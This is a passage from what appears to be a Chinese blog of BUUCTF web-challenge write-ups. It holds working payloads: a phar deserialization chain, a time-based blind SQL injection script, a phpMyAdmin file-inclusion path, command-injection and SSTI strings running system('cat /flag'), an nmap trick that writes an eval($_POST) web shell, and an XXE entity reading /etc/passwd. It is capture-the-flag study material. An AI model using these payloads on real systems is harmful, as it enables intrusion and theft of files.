class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>查看源码，发现在最后能过文件上传直接尝试通过传参上传文件<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093238852.png" class="" title="image-20250706093238852">发现可以上传php文件没有过滤并且上传成功的木马可以被解析<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093320998.png" class="" title="image-20250706093320998">应该是非预期解，预期应该通过phar反序列化进行做题。阅读代码发现利用点在<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091151922.png" class="" title="image-20250706091151922">没有unsearsize这样的利用点<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091430516.png" class="" title="image-20250706091430516">file_exists可以被phar进行利用利用gc回收机制绕过weakup<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;ture&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setDefaultStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure># [NewStarCTF 2023 公开赛道]midsql尝试注入发现过滤了空格和=使用/**/和like进行绕过即可但是发现其无回显，使用时间盲注<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e8dc055e-b6d6-46c3-9770-01d66d39ee7d.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        payload = url + <span class="string">f&quot;1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(payload).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        use_time = end_time - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> use_time &gt; <span class="number">2</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(mid)</span><br><span class="line">    database_name += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(database_name)</span><br></pre></td></tr></table></figure># [GWCTF 2019]我有一个数据库#### [phpMyAdmin](https://so.csdn.net/so/search?q=phpMyAdmin&spm=1001.2101.3001.7020) 4.8.1 远程文件包含 CVE-2018-12613 漏洞复现/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag直接读取flag文件[CVE-2018-12613 PhpMyadmin后台文件包含复现 - 北孤清茶。 - 博客园](https://www.cnblogs.com/lthlsy/p/14775131.html)参考文章[ThinkPHP]5-Rce[thinkphp 5-rce版本漏洞复现(超详细版)_thinkphp 漏洞扫描-CSDN博客](https://blog.csdn.net/weixin_44862511/article/details/132132998)打cve进行rce# [WUSTCTF2020]朴实无华先扫目录有robots.txt查看发现假的flag抓包发现响应头中隐藏这一个页面/fl4g.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看你，看我的动力淡了，不是想看时间，只是想不经意间让你知道我曾经比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;用钱解决不了空虚人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这不算闯关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想要在这个CTFer拿到flag么，意识流溢出，前往东郊村，找到一定的线索，把推理讲出去，自然有道，才学可窃.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我从烧烤摊看我的眼神里，看他打了个电话，把他一定安排到不是闯关的人&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这不算闯关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想要到这里，我得完全破防，有钱人的心理多多少少就是这样的空虚无聊，并且自私.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;马上滚出考场&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这不算闯关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-<span class="number">20250707021034112</span>.png image-<span class="number">20250707021034112</span> %&#125;</span><br></pre></td></tr></table></figure>第一层科学计数法绕过，第二层md5若比较使用$IFS$9来绕过对空格的过滤?num=11e3&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag# [BJDCTF2020]Mark loves catdirsearch扫目录发现.git可能存在源码泄露上网但是使用githack无法拉取下来源码，可能是题目环境问题上网查找源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// 包含外部文件 &#x27;flag.php&#x27;，可能包含变量 $flag include &#x27;flag.php&#x27;; // 初始化三个变量 $yds = &quot;dog&quot;;     // $yds 被设置为 &quot;dog&quot; $is = &quot;cat&quot;;      // $is 被设置为 &quot;cat&quot; $handsome = &#x27;yds&#x27;; // $handsome 被设置为字符串 &#x27;yds&#x27; // 遍历 $_POST 数组，将每个键值对赋值给动态生成的变量 foreach($_POST as $x =&gt; $y)&#123;    $$x = $y; // 例如，如果 $_POST 包含 &#x27;foo&#x27; =&gt; &#x27;bar&#x27;，则生成 $foo = &#x27;bar&#x27; &#125; // 遍历 $_GET 数组，将每个键值对赋值给动态生成的变量 foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y; // 例如，如果 $_GET 包含 &#x27;foo&#x27; =&gt; &#x27;bar&#x27;，则生成 $foo = $bar 的值 &#125; // 再次遍历 $_GET 数组，检查特定条件 foreach($_GET as $x =&gt; $y)&#123;    // 如果 $_GET[&#x27;flag&#x27;] 的值等于当前键名且键名不为 &#x27;flag&#x27;    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;        // 输出 $handsome 的值并终止脚本执行        exit($handsome);    &#125; &#125; // 检查是否存在 $_GET[&#x27;flag&#x27;] 或 $_POST[&#x27;flag&#x27;] if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;    // 如果这两个参数都没有被设置，输出 $yds 的值并终止脚本执行    exit($yds); &#125; // 检查 $_POST[&#x27;flag&#x27;] 或 $_GET[&#x27;flag&#x27;] 是否等于字符串 &#x27;flag&#x27; if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;    // 如果其中一个等于 &#x27;flag&#x27;，输出 $is 的值并终止脚本执行    exit($is); &#125; // 最后输出变量 $flag 的值 echo &quot;the flag is: &quot;.$flag; ?&gt;</span></span><br></pre></td></tr></table></figure>查看源码考察变量覆盖就是通过为变量赋值另外的一个变量的变量名来进行绕过?handsome=flag&flag=x&x=flag[CISCN2019 华东南赛区]Web11根据内容推测ssrf<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707103155907.png" class="" title="image-20250707103155907">更改为本地ip，发现右上角IP地址改变，应该是注入点fuzz识别是什么注入漏洞应该是ssti模板注入dirsearch扫描发现是smarty 模板{system('cat /flag')}上网查寻可以直接使用system进行rce<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153124322.png" class="" title="image-20250707153124322"># [BJDCTF2020]The mystery of ip查看ip测试更改本地ip发现会直接回显，测试ssti发现<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153942714.png" class="" title="image-20250707153942714">测试模板类型<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154133792.png" class="" title="image-20250707154133792">发现是smarty<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154144518.png" class="" title="image-20250707154144518">直接使用system进行测试能够直接执行指令# [BJDCTF2020]ZJCTF，不过如此?text=php://input&file=php://filter/convert.base64-encode/resource=next.php使用input和filter协议阅读next.php文件内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>查看代码发现需要使用getflag这个函数来进行rce在php5中preg_replace /e存在漏洞可以进行命令执行通过\S让其匹配空字符来确定后面可以调用getflag函数来进行rce\S*={${getFlag()}}&cmd=system('cat /flag');# [BUUCTF 2018]Online Tool<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">  @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">其使用了</span><br><span class="line"></span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>来避免rce漏洞但是当两者一块使用时反而会触发漏洞<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707170845298.png" class="" title="image-20250707170845298">其会对特殊字符进行转义' <?php @eval($_POST["mayi"]);?><p> -oG mayi.php ‘</p><p>利用nmap的参数生成带有一句话木马的文件即可</p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>题目提示xxe注入</p><table><thead><tr><th>function doLogin(){</th></tr></thead><tbody><tr><td>var username &#x3D; $(“#username”).val();</td></tr><tr><td>var password &#x3D; $(“#password”).val();</td></tr><tr><td>if(username &#x3D;&#x3D; “” || password &#x3D;&#x3D; “”){</td></tr><tr><td>alert(“Please enter the username and password!”);</td></tr><tr><td>return;</td></tr><tr><td>}</td></tr><tr><td></td></tr><tr><td>var data &#x3D; “<user><username>“ + username + “</username><password>“ + password + “</password></user>“;</td></tr><tr><td>$.ajax({</td></tr><tr><td>type: “POST”,</td></tr><tr><td>url: “doLogin.php”,上</td></tr><tr><td>contentType: “application&#x2F;xml;charset&#x3D;utf-8”,</td></tr><tr><td>data: data,</td></tr><tr><td>dataType: “xml”,</td></tr><tr><td>anysc: false,</td></tr><tr><td>success: function (result) {</td></tr><tr><td>var code &#x3D; result.getElementsByTagName(“code”)[0].childNodes[0].nodeValue;</td></tr><tr><td>var msg &#x3D; result.getElementsByTagName(“msg”)[0].childNodes[0].nodeValue;</td></tr><tr><td>if(code &#x3D;&#x3D; “0”){</td></tr><tr><td>$(“.msg”).text(msg + “ login fail!”);</td></tr><tr><td>}else if(code &#x3D;&#x3D; “1”){</td></tr><tr><td>$(“.msg”).text(msg + “ login success!”);</td></tr><tr><td>}else{</td></tr><tr><td>$(“.msg”).text(“error:” + msg);</td></tr><tr><td>}</td></tr><tr><td>},</td></tr><tr><td>error: function (XMLHttpRequest,textStatus,errorThrown) {</td></tr><tr><td>$(“.msg”).text(errorThrown + ‘:’ + textStatus);</td></tr><tr><td>}</td></tr><tr><td>});</td></tr><tr><td>}</td></tr></tbody></table><p>查看源代码通过post将参数传入道doLogin.php之中进行判断</p><p>1111使用下述xml进行测试<!DOCTYPE foo [<!ELEMENT foo ANY ><br><!ENTITY xxe SYSTEM "file:///etc/passwd" >]&gt;<br><foo>&xxe;</foo></p><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" ><p>]&gt;<br><foo>&xxe;</foo></p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707181749696.png" class="" title="image-20250707181749696"><p>可直接出来数据内容，注意xml的格式在引用时&amp;admin后需要加入；</p><p>在xxe注入中需要注意xml文件的格式</p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707182448806.png" class="" title="image-20250707182448806"><p>存在注入点，输入什么回显什么</p><p>测试为ssti注入</p><p>通过进一步测试发现为jwit模板注入</p><p>使用常用payload进行注入，成功执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 